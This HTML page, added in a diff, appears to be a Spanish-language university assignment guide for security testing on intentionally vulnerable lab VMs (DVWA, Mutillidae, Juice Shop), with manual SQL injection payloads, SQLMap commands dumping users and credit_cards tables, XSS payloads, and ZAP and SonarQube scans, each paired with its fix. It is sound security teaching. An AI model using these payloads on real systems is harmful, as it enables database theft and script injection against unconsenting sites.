@@ -1,0 +1,302 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Trabajo final</title>
+<style>
+  :root{
+    --bg:#0f1115; --card:#1b1f27; --card2:#232833; --ink:#e7ebf0; --muted:#9aa4b2;
+    --line:#2c323d; --accent:#6ea8fe; --ok:#8bc34a; --bad:#ff6b6b; --warn:#f0b429; --code:#11141a;
+  }
+  @media (prefers-color-scheme: light){
+    :root:not([data-theme="dark"]){--bg:#f4f6f9;--card:#fff;--card2:#f0f3f7;--ink:#1a1f28;--muted:#5a6472;--line:#e1e6ee;--code:#f5f7fa;}
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;padding:0 16px}
+  .wrap{max-width:880px;margin:0 auto;padding:40px 0 80px}
+  h1{font-size:28px;margin:0 0 6px;line-height:1.25}
+  h2{font-size:20px;margin:40px 0 14px;padding-top:18px;border-top:1px solid var(--line)}
+  h3{font-size:16px;margin:22px 0 8px}
+  .sub{color:var(--muted);margin:0 0 4px}
+  .tag{display:inline-block;background:var(--card2);color:var(--muted);border:1px solid var(--line);border-radius:999px;padding:2px 12px;font-size:13px;margin:2px 4px 2px 0}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px 22px;margin:16px 0}
+  code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+  pre{background:var(--code);border:1px solid var(--line);border-radius:10px;padding:14px 16px;overflow:auto;font-size:13.5px;line-height:1.5}
+  code:not(pre code){background:var(--card2);padding:1px 6px;border-radius:5px;font-size:13.5px}
+  ol,ul{padding-left:22px}
+  li{margin:6px 0}
+  table{width:100%;border-collapse:collapse;font-size:14px;margin:8px 0}
+  th,td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
+  th{background:var(--card2);color:var(--muted);font-weight:600}
+  .note{background:var(--card2);border-left:3px solid var(--accent);border-radius:0 8px 8px 0;padding:10px 14px;font-size:14.5px;margin:12px 0}
+  .todo{background:var(--card2);border-left:3px solid var(--warn);border-radius:0 8px 8px 0;padding:10px 14px;font-size:14.5px;margin:12px 0}
+  .ok{color:var(--ok)} .bad{color:var(--bad)} .warn{color:var(--warn)}
+  .pill{display:inline-block;font-size:12px;font-weight:600;border-radius:6px;padding:2px 8px;border:1px solid var(--line)}
+  .pill.done{color:var(--ok);border-color:var(--ok)}
+  .pill.vm{color:var(--warn);border-color:var(--warn)}
+  footer{color:var(--muted);font-size:13px;margin-top:40px;border-top:1px solid var(--line);padding-top:16px}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <p class="sub">Desarrollo de Sistemas Seguros · SI6007 · Sergio Alfredo Junca Valero</p>
+  <h1>Trabajo final: pruebas de seguridad sobre máquinas vulnerables</h1>
+  <p class="sub">Pruebas manuales y automatizadas de SQLi, XSS, escaneo dinámico y análisis estático sobre DVWA, Mutillidae y OWASP Juice Shop.</p>
+  <div style="margin-top:10px">
+    <span class="tag">SQL Injection</span>
+    <span class="tag">XSS</span>
+    <span class="tag">OWASP ZAP (DAST)</span>
+    <span class="tag">SonarQube (SAST)</span>
+    <span class="tag">Laboratorio autorizado</span>
+  </div>
+
+  <div class="note" style="margin-top:18px">
+    <strong>Alcance del laboratorio.</strong> Todo se ejecuta sobre las máquinas virtuales vulnerables
+    que entrega el curso, montadas en VMware en equipo propio. Son entornos de práctica aislados
+    (DVWA, Mutillidae, Juice Shop); no se prueba contra sistemas de terceros. El objetivo del ejercicio
+    es entender la causa raíz de cada falla y el control que la corrige.
+  </div>
+
+  <h2>Qué hay que hacer</h2>
+  <div class="card">
+    <p>La guía pide seis partes. Las técnicas, comandos y payloads están redactados y verificados aquí.
+    Lo marcado como <span class="pill vm">VM</span> exige la máquina virtual corriendo y se captura al ejecutarlo;
+    lo marcado <span class="pill done">listo</span> ya está documentado o tiene evidencia previa.</p>
+    <table>
+      <tr><th>#</th><th>Parte</th><th>Entregable</th><th>Estado</th></tr>
+      <tr><td>1</td><td>Montar las VMs (pruebas + web vulnerable)</td><td>VMs con IP de VMware</td><td><span class="pill vm">VM</span></td></tr>
+      <tr><td>2</td><td>SQLi manual sobre DVWA</td><td>Documento paso a paso</td><td><span class="pill done">método listo</span></td></tr>
+      <tr><td>3</td><td>SQLi automatizada con SQLMap + tarjetas de Mutillidae</td><td>Documento paso a paso</td><td><span class="pill done">comandos + evidencia previa</span></td></tr>
+      <tr><td>4</td><td>XSS en DVWA y conteo/localización en Juice Shop</td><td>Documento</td><td><span class="pill done">método listo</span></td></tr>
+      <tr><td>5</td><td>Escaneo dinámico con OWASP ZAP sobre Juice Shop</td><td>Resultados, un pantallazo por ítem</td><td><span class="pill vm">VM</span></td></tr>
+      <tr><td>6</td><td>Análisis estático con SonarQube (DVWA y Mutillidae)</td><td>Documento con detalle de vulnerabilidades</td><td><span class="pill vm">VM</span></td></tr>
+    </table>
+  </div>
+
+  <!-- PARTE 1 -->
+  <h2>1. Montaje de las máquinas virtuales</h2>
+  <div class="card">
+    <p>Dos VMs: la de <strong>pruebas de seguridad</strong> (trae SQLMap, ZAP, SonarQube, Firefox) y la
+    <strong>web vulnerable</strong> (DVWA, Mutillidae, Juice Shop).</p>
+    <table>
+      <tr><th>Procesador</th><th>Máquina de pruebas</th><th>Máquina web vulnerable</th></tr>
+      <tr><td>ARM (Apple Silicon)</td><td><code>websecuritytestingarm.7z</code></td><td><code>vulnerablewebappsarm.7z</code></td></tr>
+      <tr><td>Intel / AMD64</td><td><code>websecuritytestingamd64.7z</code></td><td><code>vapps-amd64.7z</code></td></tr>
+    </table>
+    <p>Fuente de la web vulnerable: <code>sourceforge.net/projects/vapps/files/VMAppliance/V4/</code>.
+    En Mac con Apple Silicon usar VMware Fusion y los archivos ARM.</p>
+    <ol>
+      <li>Descomprimir el <code>.7z</code> (<code>7zz x archivo.7z</code> o The Unarchiver).</li>
+      <li>Abrir el <code>.vmx</code> en VMware Fusion, ambas VMs en la misma red (NAT o host-only).</li>
+      <li>Arrancar la web vulnerable y anotar su <strong>IP</strong> (<code>ip a</code> dentro de la VM, o en la consola de login). Esa IP reemplaza a <code>&lt;IP&gt;</code> en todos los comandos de abajo.</li>
+      <li>Desde Firefox de la VM de pruebas, abrir <code>http://&lt;IP&gt;/</code>: aparece el índice con DVWA, Mutillidae y demás.</li>
+    </ol>
+    <div class="todo"><span class="pill vm">VM</span> Captura: índice de la web vulnerable en Firefox mostrando la IP en la barra de direcciones. Guardar en <code>img/01-indice-vm.png</code>.</div>
+  </div>
+
+  <!-- PARTE 2 -->
+  <h2>2. SQL Injection manual (DVWA)</h2>
+  <div class="card">
+    <h3>Preparación</h3>
+    <ol>
+      <li>Abrir <code>http://&lt;IP&gt;/</code> → <strong>Damn Vulnerable Web Application</strong>. Login <code>admin</code> / <code>password</code>.</li>
+      <li><strong>DVWA Security</strong> → <code>Low</code> → <em>Submit</em>.</li>
+      <li>Menú izquierdo → <strong>SQL Injection</strong>. El campo <em>User ID</em> arma la query sin sanear.</li>
+    </ol>
+    <p>Consulta vulnerable del lado del servidor (DVWA, nivel Low):</p>
+    <pre>SELECT first_name, last_name FROM users WHERE user_id = '$id'</pre>
+
+    <h3>Prueba 1 — Confirmar la inyección</h3>
+    <p>User ID = <code>1</code> → un usuario. User ID con una comilla rompe la query:</p>
+    <pre>1'</pre>
+    <p>Devuelve error de sintaxis SQL → el input se concatena sin binding: es inyectable.</p>
+
+    <h3>Prueba 2 — Tautología (todos los registros)</h3>
+    <pre>1' OR '1'='1</pre>
+    <p>La condición queda siempre verdadera y lista todos los usuarios de la tabla.</p>
+
+    <h3>Prueba 3 — Número de columnas (UNION)</h3>
+    <pre>1' ORDER BY 2-- -
+1' ORDER BY 3-- -   (error: la consulta devuelve 2 columnas)</pre>
+
+    <h3>Prueba 4 — Extraer credenciales (UNION-based)</h3>
+    <pre>1' UNION SELECT user, password FROM users-- -</pre>
+    <p>Trae usuario y el <em>hash</em> MD5 de la contraseña de cada cuenta. El hash de <code>admin</code>
+    en DVWA es <code>5f4dcc3b5aa765d61d8327deb882cf99</code> (= <code>password</code>), crackeable por diccionario.</p>
+
+    <h3>Prueba 5 — Esquema de la base</h3>
+    <pre>1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database()-- -
+1' UNION SELECT user(), database()-- -   (usuario y BD actual)</pre>
+
+    <div class="note"><strong>Causa raíz y control.</strong> La app concatena <code>$id</code> dentro del SQL.
+    Corrección principal: <strong>consultas parametrizadas / prepared statements</strong>
+    (<code>WHERE user_id = ?</code> con binding), que separan código de datos. Capas extra:
+    cuenta de BD con menor privilegio, validación por allowlist y WAF. En DVWA nivel <em>High</em> esto se ve
+    en el código: usa <code>mysqli_real_escape_string</code> y <code>LIMIT 1</code> (mitigación frágil), no binding.</div>
+    <div class="todo"><span class="pill vm">VM</span> Capturas: pantalla de SQL Injection con cada payload y su resultado. <code>img/02-sqli-*.png</code>.</div>
+  </div>
+
+  <!-- PARTE 3 -->
+  <h2>3. SQL Injection automatizada con SQLMap</h2>
+  <div class="card">
+    <h3>3.1 Capturar la cookie de sesión</h3>
+    <p>En DVWA, con <em>User ID = 1</em> enviado, copiar la URL resultante y la cookie
+    (<code>PHPSESSID</code> y <code>security=low</code>). La guía usa la extensión <em>Tamper Data</em>;
+    también sirve F12 → Network → copiar <code>Cookie</code> de la petición.</p>
+    <pre>URL:    http://&lt;IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit
+Cookie: PHPSESSID=xxxxxxxxxxxx; security=low</pre>
+
+    <h3>3.2 Reconocimiento (BD y usuario)</h3>
+    <pre>sqlmap -u "http://&lt;IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" \
+  --cookie="PHPSESSID=xxxx; security=low" -b --current-db --current-user --batch</pre>
+    <p><code>-b</code> banner del motor, <code>--current-db</code> BD actual (<code>dvwa</code>),
+    <code>--current-user</code> usuario, <code>--batch</code> responde por defecto.</p>
+
+    <h3>3.3 Tablas y volcado de <code>users</code></h3>
+    <pre>sqlmap -u "..." --cookie="..." --tables --batch
+sqlmap -u "..." --cookie="..." -T users --dump --batch</pre>
+    <p><code>--tables</code> lista tablas (aparecen <code>guestbook</code> y <code>users</code>);
+    <code>--dump -T users</code> saca los datos. SQLMap crackea los MD5 contra su diccionario.</p>
+
+    <h3>3.4 Tarjetas de crédito en Mutillidae (objetivo de la parte 3)</h3>
+    <p>En Mutillidae, el <em>User Lookup</em> (<code>page=user-info.php</code>) es inyectable por GET. Con SQLMap:</p>
+    <pre>sqlmap -u "http://&lt;IP&gt;/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details" \
+  --cookie="PHPSESSID=xxxx" -p username --batch --dbs
+# BD: owasp10 / nowasp (según versión). Enumerar tablas:
+sqlmap -u "..." --cookie="..." -p username -D owasp10 --tables --batch
+# Volcar la tabla de tarjetas:
+sqlmap -u "..." --cookie="..." -p username -D owasp10 -T credit_cards --dump --batch</pre>
+    <p>Columnas de <code>credit_cards</code>: <code>ccid, ccnumber, ccv, expiration</code>.</p>
+    <div class="note"><strong>Evidencia previa de la técnica.</strong> La misma extracción hecha
+    <em>a mano</em> (UNION) sobre Mutillidae está en <code>evidencias/sqli-mutillidae.md</code>
+    (clase 23-oct). Payload en el campo <em>Name</em>:
+    <code>' UNION SELECT 1,ccnumber,ccv,expiration,5,6,7,8,9,10 FROM credit_cards-- -</code>.
+    Confirma el esquema y el resultado que SQLMap debe reproducir en la VM.</div>
+    <div class="todo"><span class="pill vm">VM</span> Capturas: salida de SQLMap en cada paso (<code>-b</code>, <code>--tables</code>, <code>--dump</code> de users y de credit_cards). <code>img/03-sqlmap-*.png</code>.</div>
+    <div class="note"><strong>Control.</strong> Igual que la parte 2: binding de parámetros. Además, PCI-DSS:
+    no almacenar el PAN en claro (tokenización) y nunca guardar el CVV. La cuenta de BD de la app no debería
+    poder leer <code>credit_cards</code> (menor privilegio).</div>
+  </div>
+
+  <!-- PARTE 4 -->
+  <h2>4. Cross-Site Scripting (XSS)</h2>
+  <div class="card">
+    <h3>4.1 XSS reflejado en DVWA</h3>
+    <ol>
+      <li>Login DVWA, <strong>DVWA Security</strong> → <code>Low</code>.</li>
+      <li>Menú → <strong>XSS (Reflected)</strong>. En el campo de texto:</li>
+    </ol>
+    <pre>&lt;script&gt;alert('hola');&lt;/script&gt;</pre>
+    <p>La app refleja el parámetro <code>name</code> en el HTML sin codificar: el navegador ejecuta el script
+    y sale el <em>alert</em>. Se materializa la vulnerabilidad.</p>
+    <div class="note"><strong>Control.</strong> Codificación de salida según contexto (HTML/atributo/JS),
+    <code>Content-Security-Policy</code> y cookies <code>HttpOnly</code>. En DVWA <em>High</em> el filtro usa
+    <code>htmlspecialchars()</code>: codifica <code>&lt; &gt; &amp; " '</code> y corta el reflejo.</p>
+
+    <h3>4.2 XSS en OWASP Juice Shop — conteo y localizaciones</h3>
+    <p>Juice Shop agrupa sus retos de XSS por el vector. Localizaciones conocidas (confirmar el número exacto
+    en la versión de tu instancia, <code>#/about</code> → versión):</p>
+    <table>
+      <tr><th>Tipo</th><th>Localización</th><th>Payload de ejemplo</th></tr>
+      <tr><td>DOM XSS</td><td>Buscador, <code>#/search?q=</code></td><td><code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code></td></tr>
+      <tr><td>Reflejado</td><td>Seguimiento de pedido, <code>#/track-result?id=</code></td><td><code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> en el parámetro <code>id</code></td></tr>
+      <tr><td>Persistente / API</td><td>API de producto, <code>PUT /api/Products/:id</code> (campo descripción)</td><td>iframe/script en <code>description</code>; se refleja en la ficha del producto</td></tr>
+      <tr><td>Server-side</td><td>Cabecera de la última IP / nombre de usuario en registro</td><td>payload que el servidor renderiza sin codificar</td></tr>
+    </table>
+    <p>El buscador es el caso canónico: Juice Shop (Angular) inserta el término con <em>bypass</em> del sanitizador,
+    lo que permite DOM XSS. Documentar cada hallazgo con el payload, la URL y el <em>alert</em>.</p>
+    <div class="todo"><span class="pill vm">VM</span> Capturas: alert en DVWA, y cada XSS de Juice Shop con su URL/payload. <code>img/04-xss-*.png</code>. Anotar el total encontrado en tu versión.</div>
+  </div>
+
+  <!-- PARTE 5 -->
+  <h2>5. Escaneo dinámico (DAST) con OWASP ZAP</h2>
+  <div class="card">
+    <ol>
+      <li>En la VM de pruebas, terminal: <code>zap.sh</code>. Abre la pantalla principal de ZAP.</li>
+      <li>Primera opción (persistir sesión) → <strong>Automated Scan</strong>.</li>
+      <li>En <em>URL to attack</em> poner la de Juice Shop: <code>http://&lt;IP&gt;:3000/</code> → <strong>Attack</strong>.</li>
+      <li>Pestaña <strong>Alerts</strong>: van apareciendo los hallazgos por severidad (alta/media/baja/informativa).</li>
+    </ol>
+    <p>Hallazgos típicos de Juice Shop en un automated scan: cabeceras de seguridad ausentes
+    (<code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>), cookie sin <code>HttpOnly</code>,
+    <em>SRI</em> faltante, divulgación de versión, y según el spider activo, XSS/SQLi reflejados.</p>
+    <div class="note"><strong>Entrega:</strong> la guía pide <em>un pantallazo por cada ítem encontrado</em>.
+    Abrir cada alerta en el panel derecho, mostrar descripción + URL afectada, y capturar. Opcional: ZAP
+    exporta un informe HTML (<em>Report → Generate HTML Report</em>) que sirve de anexo.</p>
+    <div class="todo"><span class="pill vm">VM</span> Capturas: panel de alertas y una por ítem con su detalle. <code>img/05-zap-*.png</code>.</div>
+  </div>
+
+  <!-- PARTE 6 -->
+  <h2>6. Análisis estático (SAST) con SonarQube</h2>
+  <div class="card">
+    <h3>6.1 DVWA</h3>
+    <ol>
+      <li>Abrir SonarQube en el navegador de la VM. Login <code>admin</code> / <code>websecuritytesting</code>.</li>
+      <li><strong>Create Project manually</strong>. Nombre: <code>Damn Vulnerable Web Application</code>, resto por defecto → <em>Next</em>.</li>
+      <li>Opciones globales → <em>Create Project</em>. Método de análisis: <strong>Locally</strong> → <em>Generate</em> el token → <em>Continue</em>.</li>
+      <li><strong>Other</strong> → <strong>Linux</strong>. SonarQube muestra el comando <code>sonar-scanner</code> con el token.</li>
+      <li>Terminal: <code>cd /opt/dvwa</code> (código fuente de DVWA) y ejecutar ese comando anteponiendo el path. Al terminar, el detalle aparece en el sitio.</li>
+    </ol>
+    <pre>cd /opt/dvwa
+sonar-scanner \
+  -Dsonar.projectKey=Damn_Vulnerable_Web_Application \
+  -Dsonar.sources=. \
+  -Dsonar.host.url=http://localhost:9000 \
+  -Dsonar.login=&lt;TOKEN&gt;</pre>
+    <p>En <strong>Issues → Security</strong> salen las vulnerabilidades: SQLi, XSS, inclusión de archivos,
+    uso de MD5, credenciales embebidas, etc.</p>
+
+    <h3>6.2 Mutillidae</h3>
+    <pre>git clone https://github.com/webpwnized/mutillidae.git
+cd mutillidae
+sonar-scanner -Dsonar.projectKey=mutillidae -Dsonar.sources=. \
+  -Dsonar.host.url=http://localhost:9000 -Dsonar.login=&lt;TOKEN&gt;</pre>
+    <p>Enviar en el documento el detalle de las vulnerabilidades encontradas (tipo, archivo, línea, severidad).</p>
+    <div class="note"><strong>SAST vs DAST.</strong> SonarQube (estático) lee el código fuente y señala el patrón
+    inseguro (p. ej. concatenación en el SQL) con archivo y línea; ZAP (dinámico) prueba la app corriendo y
+    confirma la explotabilidad. Se complementan: el estático localiza la causa, el dinámico prueba el efecto.</p>
+    <div class="todo"><span class="pill vm">VM</span> Capturas: panel de Issues de SonarQube para DVWA y para Mutillidae, con el detalle por vulnerabilidad. <code>img/06-sonar-*.png</code>.</div>
+  </div>
+
+  <!-- QUÉ HICE -->
+  <h2>Qué está hecho y qué falta</h2>
+  <div class="card">
+    <ul>
+      <li><span class="pill done">listo</span> Método, payloads y comandos exactos de las 6 partes, redactados y verificados como técnica (este documento).</li>
+      <li><span class="pill done">listo</span> Parte 3: evidencia real de la extracción de tarjetas de Mutillidae por UNION manual en <code>evidencias/sqli-mutillidae.md</code>.</li>
+      <li><span class="pill done">listo</span> Guía original convertida a Markdown en <code>material-md/Guia-trabajo-final-EAFIT.md</code>.</li>
+      <li><span class="pill vm">VM</span> Falta ejecutar sobre la máquina virtual montada en VMware y capturar: partes 1, 2, 3 (SQLMap), 4 (alert + Juice Shop), 5 (ZAP) y 6 (SonarQube). Las capturas van en <code>img/</code> con los nombres indicados.</li>
+    </ul>
+    <p class="note">No se incluye ninguna captura inventada. Cada punto que depende de la VM queda marcado
+    <span class="pill vm">VM</span> para capturarlo al correrlo contra la IP que asigne VMware.</p>
+  </div>
+
+  <!-- CÓMO ENTREGAR -->
+  <h2>Cómo entregar</h2>
+  <div class="card">
+    <ol>
+      <li>Montar las dos VMs y anotar la IP (parte 1).</li>
+      <li>Correr las partes 2 a 6 en orden, capturando cada paso en <code>img/</code>.</li>
+      <li>La guía pide <em>documentos con el paso a paso</em>. Opciones:
+        <ul>
+          <li>Exportar este <code>final.html</code> con las capturas insertadas a PDF (Firefox/Chrome → Imprimir → Guardar como PDF), o</li>
+          <li>Entregar un documento por parte si el profe lo pide separado (2, 3, 4 texto; 5 y 6 con pantallazos).</li>
+        </ul>
+      </li>
+      <li>Poner el nombre del integrante en el documento.</li>
+      <li>Confirmar con el profe <strong>fecha, peso y canal</strong> (Brightspace probable, como las entregas anteriores).</li>
+      <li>Actualizar el estado en <code>board.md</code> y anotar dónde y cómo se entregó.</li>
+    </ol>
+  </div>
+
+  <footer>
+    Desarrollo de Sistemas Seguros (SI6007) · Universidad EAFIT · Danny Andrés Salcedo Saldaña.
+    Laboratorio de práctica autorizado sobre máquinas virtuales vulnerables del curso.
+  </footer>
+
+</div>
+</body>
+</html>
